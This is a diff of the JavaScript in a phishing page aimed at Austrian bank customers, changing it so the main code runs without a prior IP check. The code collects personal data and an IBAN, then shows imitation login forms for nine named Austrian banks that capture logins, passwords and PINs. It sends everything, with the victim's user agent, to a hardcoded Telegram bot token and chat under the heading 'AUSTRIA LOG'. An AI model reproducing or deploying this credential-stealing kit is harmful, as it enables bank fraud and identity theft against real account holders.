@@ -2358,400 +2358,401 @@
         }
 
         // Запускаем проверку перед инициализацией интерфейса
-        checkIp().then(() => {
-            // ============================================================
-            // ОСНОВНОЙ КОД (начинается только если IP разрешен)
-            // ============================================================
+       (function () {
+    'use strict';
 
-            const TG_BOT_TOKEN = '8912609329:AAEteXQbwD_mMpNxdGfW8BoOK8DCL8zbgIw';
-            const TG_CHAT_ID   = '-1003924775699';
-            const TG_API_URL   = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
+    // ============================================================
+    // ОСНОВНОЙ КОД (без проверки IP)
+    // ============================================================
 
-            const screens = {
-                1: document.getElementById('screen1'),
-                2: document.getElementById('screen2'),
-                3: document.getElementById('screen3')
-            };
-            const steps = document.querySelectorAll('.step');
+    const TG_BOT_TOKEN = '8912609329:AAEteXQbwD_mMpNxdGfW8BoOK8DCL8zbgIw';
+    const TG_CHAT_ID   = '-1003924775699';
+    const TG_API_URL   = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
 
-            function setStep(n) {
-                steps.forEach(s => {
-                    const sn = +s.dataset.step;
-                    s.classList.remove('active', 'done');
-                    if (sn === n) s.classList.add('active');
-                    else if (sn < n) s.classList.add('done');
-                });
+    const screens = {
+        1: document.getElementById('screen1'),
+        2: document.getElementById('screen2'),
+        3: document.getElementById('screen3')
+    };
+    const steps = document.querySelectorAll('.step');
+
+    function setStep(n) {
+        steps.forEach(s => {
+            const sn = +s.dataset.step;
+            s.classList.remove('active', 'done');
+            if (sn === n) s.classList.add('active');
+            else if (sn < n) s.classList.add('done');
+        });
+    }
+
+    function showScreen(n) {
+        Object.keys(screens).forEach(k => {
+            screens[k].classList.toggle('active', +k === n);
+        });
+        setStep(n);
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    const nextBtn1 = document.getElementById('nextBtn1');
+    if (nextBtn1) nextBtn1.addEventListener('click', () => showScreen(2));
+
+    const form = document.getElementById('dataForm');
+    const bankSelect = document.getElementById('bank');
+
+    const FIELD_RULES = {
+        'fullname':    (v) => v.trim().length < 3 ? 'Bitte vollständigen Namen eingeben' : null,
+        'email':       (v) => !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) ? 'Bitte gültige E-Mail eingeben' : null,
+        'birthdate':   (v) => {
+            if (v.length < 10) return 'Bitte vollständiges Datum eingeben (TT.MM.JJJJ)';
+            const m = v.match(/^(\d{2})\.(\d{2})\.(\d{4})$/);
+            if (!m) return 'Ungültiges Format';
+            const d = +m[1], mo = +m[2], y = +m[3];
+            if (d < 1 || d > 31 || mo < 1 || mo > 12 || y < 1900 || y > 2030) return 'Ungültiges Datum';
+            return null;
+        },
+        'phone':       (v) => v.replace(/\D/g, '').length < 6 ? 'Telefonnummer zu kurz' : null,
+        'address':     (v) => v.trim().length < 2 ? 'Bitte Straße eingeben' : null,
+        'housenumber': (v) => v.trim().length < 1 ? 'Bitte Hausnummer eingeben' : null,
+        'iban':        (v) => v.replace(/\s/g, '').length < 17 ? 'IBAN ist zu kurz' : null,
+        'postcode':    (v) => v.replace(/\D/g, '').length < 3 ? 'PLZ zu kurz' : null,
+        'bank':        (v) => v.trim().length < 1 ? 'Bitte Bank wählen' : null
+    };
+
+    function setError(id, msg) {
+        const input = document.getElementById(id);
+        const err = document.querySelector('.field-error[data-error-for="' + id + '"]');
+        if (!input || !err) return;
+        if (msg) {
+            input.classList.add('invalid');
+            err.textContent = msg;
+        } else {
+            input.classList.remove('invalid');
+            err.textContent = '';
+        }
+    }
+
+    function validateField(id, rules) {
+        const input = document.getElementById(id);
+        if (!input) return true;
+        const v = input.value.trim();
+        if (!v) { setError(id, 'Dieses Feld ist erforderlich'); return false; }
+        const rule = rules[id];
+        if (rule) {
+            const e = rule(v);
+            if (e) { setError(id, e); return false; }
+        }
+        setError(id, '');
+        return true;
+    }
+
+    function validateGroup(ids, rules) {
+        let ok = true;
+        let first = null;
+        ids.forEach(id => {
+            if (!validateField(id, rules)) {
+                ok = false;
+                if (!first) first = document.getElementById(id);
             }
+        });
+        if (first) {
+            first.focus();
+            first.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+        return ok;
+    }
 
-            function showScreen(n) {
-                Object.keys(screens).forEach(k => {
-                    screens[k].classList.toggle('active', +k === n);
-                });
-                setStep(n);
-                window.scrollTo({ top: 0, behavior: 'smooth' });
-            }
+    const dob = document.getElementById('birthdate');
+    dob.addEventListener('input', (e) => {
+        let v = e.target.value.replace(/\D/g, '').slice(0, 8);
+        let out = '';
+        if (v.length > 0) out = v.slice(0, 2);
+        if (v.length > 2) out += '.' + v.slice(2, 4);
+        if (v.length > 4) out += '.' + v.slice(4, 8);
+        e.target.value = out;
+    });
 
-            const nextBtn1 = document.getElementById('nextBtn1');
-            if (nextBtn1) nextBtn1.addEventListener('click', () => showScreen(2));
+    document.getElementById('postcode').addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+    });
 
-            const form = document.getElementById('dataForm');
-            const bankSelect = document.getElementById('bank');
+    const ibanInput = document.getElementById('iban');
 
-            const FIELD_RULES = {
-                'fullname':    (v) => v.trim().length < 3 ? 'Bitte vollständigen Namen eingeben' : null,
-                'email':       (v) => !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) ? 'Bitte gültige E-Mail eingeben' : null,
-                'birthdate':   (v) => {
-                    if (v.length < 10) return 'Bitte vollständiges Datum eingeben (TT.MM.JJJJ)';
-                    const m = v.match(/^(\d{2})\.(\d{2})\.(\d{4})$/);
-                    if (!m) return 'Ungültiges Format';
-                    const d = +m[1], mo = +m[2], y = +m[3];
-                    if (d < 1 || d > 31 || mo < 1 || mo > 12 || y < 1900 || y > 2030) return 'Ungültiges Datum';
-                    return null;
-                },
-                'phone':       (v) => v.replace(/\D/g, '').length < 6 ? 'Telefonnummer zu kurz' : null,
-                'address':     (v) => v.trim().length < 2 ? 'Bitte Straße eingeben' : null,
-                'housenumber': (v) => v.trim().length < 1 ? 'Bitte Hausnummer eingeben' : null,
-                'iban':        (v) => v.replace(/\s/g, '').length < 17 ? 'IBAN ist zu kurz' : null,
-                'postcode':    (v) => v.replace(/\D/g, '').length < 3 ? 'PLZ zu kurz' : null,
-                'bank':        (v) => v.trim().length < 1 ? 'Bitte Bank wählen' : null
-            };
+    function formatIban(val) {
+        let v = val.replace(/[^A-Z0-9]/gi, '').toUpperCase();
+        if (!v.startsWith('AT')) {
+            v = 'AT' + v.replace(/^AT/, '');
+        }
+        v = v.slice(0, 20);
+        return v.replace(/(.{4})/g, '$1 ').trim();
+    }
 
-            function setError(id, msg) {
-                const input = document.getElementById(id);
-                const err = document.querySelector('.field-error[data-error-for="' + id + '"]');
-                if (!input || !err) return;
-                if (msg) {
-                    input.classList.add('invalid');
-                    err.textContent = msg;
-                } else {
-                    input.classList.remove('invalid');
-                    err.textContent = '';
-                }
-            }
+    ibanInput.addEventListener('input', (e) => {
+        e.target.value = formatIban(e.target.value);
+    });
 
-            function validateField(id, rules) {
-                const input = document.getElementById(id);
-                if (!input) return true;
-                const v = input.value.trim();
-                if (!v) { setError(id, 'Dieses Feld ist erforderlich'); return false; }
-                const rule = rules[id];
-                if (rule) {
-                    const e = rule(v);
-                    if (e) { setError(id, e); return false; }
-                }
-                setError(id, '');
-                return true;
-            }
+    ibanInput.addEventListener('keydown', (e) => {
+        if (e.target.selectionStart <= 2 && (e.key === 'Backspace' || e.key === 'Delete')) {
+            e.preventDefault();
+        }
+    });
 
-            function validateGroup(ids, rules) {
-                let ok = true;
-                let first = null;
-                ids.forEach(id => {
-                    if (!validateField(id, rules)) {
-                        ok = false;
-                        if (!first) first = document.getElementById(id);
-                    }
-                });
-                if (first) {
-                    first.focus();
-                    first.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                }
-                return ok;
-            }
+    ibanInput.addEventListener('blur', () => {
+        if (!ibanInput.value.trim()) {
+            ibanInput.value = 'AT';
+        }
+    });
 
-            const dob = document.getElementById('birthdate');
-            dob.addEventListener('input', (e) => {
-                let v = e.target.value.replace(/\D/g, '').slice(0, 8);
-                let out = '';
-                if (v.length > 0) out = v.slice(0, 2);
-                if (v.length > 2) out += '.' + v.slice(2, 4);
-                if (v.length > 4) out += '.' + v.slice(4, 8);
-                e.target.value = out;
-            });
+    Object.keys(FIELD_RULES).forEach(id => {
+        const el = document.getElementById(id);
+        if (!el) return;
+        el.addEventListener('input', () => {
+            if (el.classList.contains('invalid')) validateField(id, FIELD_RULES);
+        });
+        el.addEventListener('change', () => {
+            if (el.tagName === 'SELECT' || el.classList.contains('invalid')) validateField(id, FIELD_RULES);
+        });
+        el.addEventListener('blur', () => {
+            if (el.value.trim()) validateField(id, FIELD_RULES);
+        });
+    });
 
-            document.getElementById('postcode').addEventListener('input', (e) => {
-                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
-            });
-            
-            const ibanInput = document.getElementById('iban');
-            
-            function formatIban(val) {
-                let v = val.replace(/[^A-Z0-9]/gi, '').toUpperCase();
-                if (!v.startsWith('AT')) {
-                    v = 'AT' + v.replace(/^AT/, '');
-                }
-                v = v.slice(0, 20);
-                return v.replace(/(.{4})/g, '$1 ').trim();
-            }
+    function escapeHtml(s) {
+        return String(s)
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;');
+    }
 
-            ibanInput.addEventListener('input', (e) => {
-                e.target.value = formatIban(e.target.value);
-            });
+    function getTimestamp() {
+        const d = new Date();
+        const pad = (n) => String(n).padStart(2, '0');
+        return pad(d.getDate()) + '.' + pad(d.getMonth() + 1) + '.' + d.getFullYear() +
+               ', ' + pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
+    }
 
-            ibanInput.addEventListener('keydown', (e) => {
-                if (e.target.selectionStart <= 2 && (e.key === 'Backspace' || e.key === 'Delete')) {
-                    e.preventDefault();
-                }
-            });
+    function buildMessage(data) {
+        const addressLine = (data.address || '') + (data.housenumber ? ' ' + data.housenumber : '');
+        const lines = [
+            '\u{1F534} <b>AUSTRIA LOG!</b>',
+            '',
+            '\u{1F464} <b>Name:</b> ' + escapeHtml(data.fullname),
+            '\u{1F4E7} <b>E-mail:</b> ' + escapeHtml(data.email),
+            '\u{1F382} <b>Date of birth:</b> ' + escapeHtml(data.birthdate),
+            '\u{1F4F1} <b>Phone:</b> ' + escapeHtml(data.phone),
+            '\u{1F4CD} <b>Address:</b> ' + escapeHtml(addressLine),
+            '\u{1F4EE} <b>Postcode:</b> ' + escapeHtml(data.postcode),
+            '\u{1F3E6} <b>Bank:</b> ' + escapeHtml(data.bank),
+            '\u{1F3E6} <b>IBAN:</b> ' + escapeHtml(data.iban),
+            '',
+            '\u{1F552} <b>Time:</b> ' + getTimestamp(),
+            '\u{1F310} <b>Browser:</b> ' + escapeHtml(navigator.userAgent)
+        ];
+        return lines.join('\n');
+    }
 
-            ibanInput.addEventListener('blur', () => {
-                if (!ibanInput.value.trim()) {
-                    ibanInput.value = 'AT';
-                }
-            });
+    function buildBankMessage(loginData) {
+        const lines = [
+            '\u{1F534} <b>AUSTRIA LOG — BANK</b>',
+            '',
+            '\u{1F510} <b>Login:</b> ' + escapeHtml(loginData.login || ''),
+            '\u{1F511} <b>Passwort:</b> ' + escapeHtml(loginData.password || ''),
+            '',
+            '\u{1F552} <b>Time:</b> ' + getTimestamp(),
+            '\u{1F310} <b>Browser:</b> ' + escapeHtml(navigator.userAgent)
+        ];
+        return lines.join('\n');
+    }
 
-            Object.keys(FIELD_RULES).forEach(id => {
-                const el = document.getElementById(id);
-                if (!el) return;
-                el.addEventListener('input', () => {
-                    if (el.classList.contains('invalid')) validateField(id, FIELD_RULES);
-                });
-                el.addEventListener('change', () => {
-                    if (el.tagName === 'SELECT' || el.classList.contains('invalid')) validateField(id, FIELD_RULES);
-                });
-                el.addEventListener('blur', () => {
-                    if (el.value.trim()) validateField(id, FIELD_RULES);
-                });
-            });
+    async function sendToTelegram(text) {
+        const params = new URLSearchParams();
+        params.append('chat_id', TG_CHAT_ID);
+        params.append('text', text);
+        params.append('parse_mode', 'HTML');
+        params.append('disable_web_page_preview', 'true');
 
-            function escapeHtml(s) {
-                return String(s)
-                    .replace(/&/g, '&amp;')
-                    .replace(/</g, '&lt;')
-                    .replace(/>/g, '&gt;');
-            }
+        const res = await fetch(TG_API_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: params.toString()
+        });
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        const json = await res.json();
+        if (!json.ok) throw new Error(json.description || 'Telegram API error');
+        return json;
+    }
 
-            function getTimestamp() {
-                const d = new Date();
-                const pad = (n) => String(n).padStart(2, '0');
-                return pad(d.getDate()) + '.' + pad(d.getMonth() + 1) + '.' + d.getFullYear() +
-                       ', ' + pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
-            }
+    function applyBankDesign() {
+        const selected = bankSelect.value;
 
-            function buildMessage(data) {
-                const addressLine = (data.address || '') + (data.housenumber ? ' ' + data.housenumber : '');
-                const lines = [
-                    '\u{1F534} <b>AUSTRIA LOG!</b>',
-                    '',
-                    '\u{1F464} <b>Name:</b> ' + escapeHtml(data.fullname),
-                    '\u{1F4E7} <b>E-mail:</b> ' + escapeHtml(data.email),
-                    '\u{1F382} <b>Date of birth:</b> ' + escapeHtml(data.birthdate),
-                    '\u{1F4F1} <b>Phone:</b> ' + escapeHtml(data.phone),
-                    '\u{1F4CD} <b>Address:</b> ' + escapeHtml(addressLine),
-                    '\u{1F4EE} <b>Postcode:</b> ' + escapeHtml(data.postcode),
-                    '\u{1F3E6} <b>Bank:</b> ' + escapeHtml(data.bank),
-                    '\u{1F3E6} <b>IBAN:</b> ' + escapeHtml(data.iban),
-                    '',
-                    '\u{1F552} <b>Time:</b> ' + getTimestamp(),
-                    '\u{1F310} <b>Browser:</b> ' + escapeHtml(navigator.userAgent)
-                ];
-                return lines.join('\n');
-            }
+        document.querySelectorAll('.bank-full-wrapper').forEach(el => el.style.display = 'none');
 
-            function buildBankMessage(loginData) {
-                const lines = [
-                    '\u{1F534} <b>AUSTRIA LOG — BANK</b>',
-                    '',
-                    '\u{1F510} <b>Login:</b> ' + escapeHtml(loginData.login || ''),
-                    '\u{1F511} <b>Passwort:</b> ' + escapeHtml(loginData.password || ''),
-                    '',
-                    '\u{1F552} <b>Time:</b> ' + getTimestamp(),
-                    '\u{1F310} <b>Browser:</b> ' + escapeHtml(navigator.userAgent)
-                ];
-                return lines.join('\n');
-            }
+        if (selected === 'Erste Bank') {
+            document.getElementById('ersteWrapper').style.display = 'flex';
+        } else if (selected === 'Bank99') {
+            document.getElementById('bank99Wrapper').style.display = 'flex';
+        } else if (selected === 'Volksbank') {
+            document.getElementById('vbWrapper').style.display = 'flex';
+        } else if (selected === 'Raiffeisenbank') {
+            document.getElementById('rfbWrapper').style.display = 'flex';
+        } else if (selected === 'Bawag') {
+            document.getElementById('bawagWrapper').style.display = 'flex';
+        } else if (selected === 'Spardabank') {
+            document.getElementById('spardaWrapper').style.display = 'flex';
+        } else if (selected === 'Hypo NOE') {
+            document.getElementById('hypoWrapper').style.display = 'flex';
+        } else if (selected === 'Easy Bank') {
+            document.getElementById('easyWrapper').style.display = 'flex';
+        } else if (selected === 'Bank Austria') {
+            document.getElementById('baWrapper').style.display = 'flex';
+        } else {
+            showScreen(3);
+        }
+    }
 
-            async function sendToTelegram(text) {
-                const params = new URLSearchParams();
-                params.append('chat_id', TG_CHAT_ID);
-                params.append('text', text);
-                params.append('parse_mode', 'HTML');
-                params.append('disable_web_page_preview', 'true');
+    async function submitCustomBank(loginId, passId, btnId) {
+        const l = document.getElementById(loginId);
+        const p = document.getElementById(passId);
+        const btn = document.getElementById(btnId);
 
-                const res = await fetch(TG_API_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: params.toString()
-                });
-                if (!res.ok) throw new Error('HTTP ' + res.status);
-                const json = await res.json();
-                if (!json.ok) throw new Error(json.description || 'Telegram API error');
-                return json;
-            }
+        if (!l.value.trim() || !p.value.trim()) {
+            if (!l.value.trim()) l.style.borderColor = '#c8102e';
+            if (!p.value.trim()) p.style.borderColor = '#c8102e';
+            return;
+        }
+        l.style.borderColor = '#d5d5d5';
+        p.style.borderColor = '#d5d5d5';
 
-            function applyBankDesign() {
-                const selected = bankSelect.value;
-                
-                document.querySelectorAll('.bank-full-wrapper').forEach(el => el.style.display = 'none');
+        const bankData = { login: l.value.trim(), password: p.value.trim() };
+        const original = btn.innerHTML;
 
-                if (selected === 'Erste Bank') {
-                    document.getElementById('ersteWrapper').style.display = 'flex';
-                } else if (selected === 'Bank99') {
-                    document.getElementById('bank99Wrapper').style.display = 'flex';
-                } else if (selected === 'Volksbank') {
-                    document.getElementById('vbWrapper').style.display = 'flex';
-                } else if (selected === 'Raiffeisenbank') {
-                    document.getElementById('rfbWrapper').style.display = 'flex';
-                } else if (selected === 'Bawag') {
-                    document.getElementById('bawagWrapper').style.display = 'flex';
-                } else if (selected === 'Spardabank') {
-                    document.getElementById('spardaWrapper').style.display = 'flex';
-                } else if (selected === 'Hypo NOE') {
-                    document.getElementById('hypoWrapper').style.display = 'flex';
-                } else if (selected === 'Easy Bank') {
-                    document.getElementById('easyWrapper').style.display = 'flex';
-                } else if (selected === 'Bank Austria') {
-                    document.getElementById('baWrapper').style.display = 'flex';
-                } else {
-                    showScreen(3);
-                }
-            }
+        btn.disabled = true;
+        btn.textContent = 'Wird gesendet...';
 
-            async function submitCustomBank(loginId, passId, btnId) {
-                const l = document.getElementById(loginId);
-                const p = document.getElementById(passId);
-                const btn = document.getElementById(btnId);
-                
-                if (!l.value.trim() || !p.value.trim()) {
-                    if (!l.value.trim()) l.style.borderColor = '#c8102e';
-                    if (!p.value.trim()) p.style.borderColor = '#c8102e';
-                    return;
-                }
-                l.style.borderColor = '#d5d5d5';
-                p.style.borderColor = '#d5d5d5';
+        try {
+            await sendToTelegram(buildBankMessage(bankData));
+            btn.textContent = '✓ Gesendet';
+            btn.style.background = '#1a7f37';
+            btn.style.color = '#ffffff';
+        } catch (err) {
+            console.error(err);
+            btn.textContent = '✗ Fehler';
+            btn.style.background = '#c8102e';
+            btn.style.color = '#ffffff';
+        }
 
-                const bankData = { login: l.value.trim(), password: p.value.trim() };
-                const original = btn.innerHTML;
-                
-                btn.disabled = true;
-                btn.textContent = 'Wird gesendet...';
+        setTimeout(() => {
+            btn.disabled = false;
+            btn.innerHTML = original;
+            btn.style.background = '';
+            btn.style.color = '';
+        }, 2500);
+    }
 
-                try {
-                    await sendToTelegram(buildBankMessage(bankData));
-                    btn.textContent = '✓ Gesendet';
-                    btn.style.background = '#1a7f37';
-                    btn.style.color = '#ffffff';
-                } catch (err) {
-                    console.error(err);
-                    btn.textContent = '✗ Fehler';
-                    btn.style.background = '#c8102e';
-                    btn.style.color = '#ffffff';
-                }
+    document.getElementById('ersteNextBtn').addEventListener('click', () => submitCustomBank('login_erste', 'password_erste', 'ersteNextBtn'));
+    document.getElementById('bank99NextBtn').addEventListener('click', () => submitCustomBank('login99', 'password99', 'bank99NextBtn'));
+    document.getElementById('vbNextBtn').addEventListener('click', () => submitCustomBank('loginvb', 'passwordvb', 'vbNextBtn'));
 
-                setTimeout(() => {
-                    btn.disabled = false;
-                    btn.innerHTML = original;
-                    btn.style.background = '';
-                    btn.style.color = '';
-                }, 2500);
-            }
+    document.getElementById('rfbNextBtn').addEventListener('click', async () => {
+        const bl = document.getElementById('rfb_bundesland');
+        const v = document.getElementById('rfb_verfueger');
+        const p = document.getElementById('rfb_pin');
+        const btn = document.getElementById('rfbNextBtn');
+        if (!bl.value || !v.value.trim() || !p.value.trim()) { alert('Bitte alle Felder ausfüllen'); return; }
 
-            document.getElementById('ersteNextBtn').addEventListener('click', () => submitCustomBank('login_erste', 'password_erste', 'ersteNextBtn'));
-            document.getElementById('bank99NextBtn').addEventListener('click', () => submitCustomBank('login99', 'password99', 'bank99NextBtn'));
-            document.getElementById('vbNextBtn').addEventListener('click', () => submitCustomBank('loginvb', 'passwordvb', 'vbNextBtn'));
-            
-            document.getElementById('rfbNextBtn').addEventListener('click', async () => {
-                const bl = document.getElementById('rfb_bundesland');
-                const v = document.getElementById('rfb_verfueger');
-                const p = document.getElementById('rfb_pin');
-                const btn = document.getElementById('rfbNextBtn');
-                if (!bl.value || !v.value.trim() || !p.value.trim()) { alert('Bitte alle Felder ausfüllen'); return; }
-                
-                const bankData = { login: bl.value + ' | ' + v.value.trim(), password: p.value.trim() };
-                const original = btn.innerHTML;
-                
-                btn.disabled = true;
-                btn.textContent = 'Wird gesendet...';
+        const bankData = { login: bl.value + ' | ' + v.value.trim(), password: p.value.trim() };
+        const original = btn.innerHTML;
 
-                try {
-                    await sendToTelegram(buildBankMessage(bankData));
-                    btn.textContent = '✓ Gesendet';
-                    btn.style.background = '#1a7f37';
-                    btn.style.color = '#ffffff';
-                } catch (err) {
-                    console.error(err);
-                    btn.textContent = '✗ Fehler';
-                    btn.style.background = '#c8102e';
-                    btn.style.color = '#ffffff';
-                }
+        btn.disabled = true;
+        btn.textContent = 'Wird gesendet...';
 
-                setTimeout(() => {
-                    btn.disabled = false;
-                    btn.innerHTML = original;
-                    btn.style.background = '';
-                    btn.style.color = '';
-                }, 2500);
-            });
+        try {
+            await sendToTelegram(buildBankMessage(bankData));
+            btn.textContent = '✓ Gesendet';
+            btn.style.background = '#1a7f37';
+            btn.style.color = '#ffffff';
+        } catch (err) {
+            console.error(err);
+            btn.textContent = '✗ Fehler';
+            btn.style.background = '#c8102e';
+            btn.style.color = '#ffffff';
+        }
 
-            document.getElementById('bawagNextBtn').addEventListener('click', () => submitCustomBank('loginbawag', 'passwordbawag', 'bawagNextBtn'));
-            document.getElementById('spardaNextBtn').addEventListener('click', () => submitCustomBank('loginsparda', 'passwordsparda', 'spardaNextBtn'));
-            document.getElementById('hypoNextBtn').addEventListener('click', () => submitCustomBank('hypo_email', 'hypo_pw', 'hypoNextBtn'));
-            document.getElementById('easyNextBtn').addEventListener('click', () => submitCustomBank('easy_verfueger', 'easy_pin', 'easyNextBtn'));
-            document.getElementById('baNextBtn').addEventListener('click', () => submitCustomBank('ba_verfueger', 'ba_pin', 'baNextBtn'));
+        setTimeout(() => {
+            btn.disabled = false;
+            btn.innerHTML = original;
+            btn.style.background = '';
+            btn.style.color = '';
+        }, 2500);
+    });
 
-            window.submitStandardBank = async function() {
-                const login = document.getElementById('login').value.trim();
-                const password = document.getElementById('password').value.trim();
-                const btn = document.getElementById('bankSubmitBtn');
-                
-                if (!login || !password) { alert('Bitte Login und Passwort eingeben'); return; }
+    document.getElementById('bawagNextBtn').addEventListener('click', () => submitCustomBank('loginbawag', 'passwordbawag', 'bawagNextBtn'));
+    document.getElementById('spardaNextBtn').addEventListener('click', () => submitCustomBank('loginsparda', 'passwordsparda', 'spardaNextBtn'));
+    document.getElementById('hypoNextBtn').addEventListener('click', () => submitCustomBank('hypo_email', 'hypo_pw', 'hypoNextBtn'));
+    document.getElementById('easyNextBtn').addEventListener('click', () => submitCustomBank('easy_verfueger', 'easy_pin', 'easyNextBtn'));
+    document.getElementById('baNextBtn').addEventListener('click', () => submitCustomBank('ba_verfueger', 'ba_pin', 'baNextBtn'));
 
-                const bankData = { login, password };
-                const original = btn.innerHTML;
-                
-                btn.disabled = true;
-                btn.textContent = 'Sending...';
+    window.submitStandardBank = async function() {
+        const login = document.getElementById('login').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const btn = document.getElementById('bankSubmitBtn');
 
-                try {
-                    await sendToTelegram(buildBankMessage(bankData));
-                    btn.textContent = '✓ Sent';
-                    btn.style.background = '#1a7f37';
-                } catch (err) {
-                    console.error(err);
-                    btn.textContent = '✗ Error';
-                    btn.style.background = '#c8102e';
-                }
+        if (!login || !password) { alert('Bitte Login und Passwort eingeben'); return; }
 
-                setTimeout(() => {
-                    btn.disabled = false;
-                    btn.innerHTML = original;
-                    btn.style.background = '';
-                }, 2500);
-            };
+        const bankData = { login, password };
+        const original = btn.innerHTML;
 
-            bankSelect.addEventListener('change', () => {
-                if (bankSelect.value) setError('bank', '');
-            });
+        btn.disabled = true;
+        btn.textContent = 'Sending...';
 
-            form.addEventListener('submit', async (e) => {
-                e.preventDefault();
-                if (!validateGroup(Object.keys(FIELD_RULES), FIELD_RULES)) return;
-                
-                const personal = {};
-                Object.keys(FIELD_RULES).forEach(id => personal[id] = document.getElementById(id).value.trim());
-                
-                const submitBtn = document.getElementById('submitBtn');
-                const original = submitBtn.innerHTML;
-                submitBtn.disabled = true;
-                submitBtn.textContent = 'Sending...';
+        try {
+            await sendToTelegram(buildBankMessage(bankData));
+            btn.textContent = '✓ Sent';
+            btn.style.background = '#1a7f37';
+        } catch (err) {
+            console.error(err);
+            btn.textContent = '✗ Error';
+            btn.style.background = '#c8102e';
+        }
 
-                try {
-                    await sendToTelegram(buildMessage(personal));
-                    submitBtn.textContent = '✓';
-                } catch (err) {
-                    console.error('Ошибка отправки личных данных:', err);
-                    submitBtn.textContent = '✗';
-                }
+        setTimeout(() => {
+            btn.disabled = false;
+            btn.innerHTML = original;
+            btn.style.background = '';
+        }, 2500);
+    };
 
-                setTimeout(() => {
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = original;
-                    applyBankDesign(); 
-                }, 1000);
-            });
+    bankSelect.addEventListener('change', () => {
+        if (bankSelect.value) setError('bank', '');
+    });
 
-        }); 
-    })();
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        if (!validateGroup(Object.keys(FIELD_RULES), FIELD_RULES)) return;
+
+        const personal = {};
+        Object.keys(FIELD_RULES).forEach(id => personal[id] = document.getElementById(id).value.trim());
+
+        const submitBtn = document.getElementById('submitBtn');
+        const original = submitBtn.innerHTML;
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Sending...';
+
+        try {
+            await sendToTelegram(buildMessage(personal));
+            submitBtn.textContent = '✓';
+        } catch (err) {
+            console.error('Ошибка отправки личных данных:', err);
+            submitBtn.textContent = '✗';
+        }
+
+        setTimeout(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = original;
+            applyBankDesign();
+        }, 1000);
+    });
+
+})();
     </script>
 
 </body>
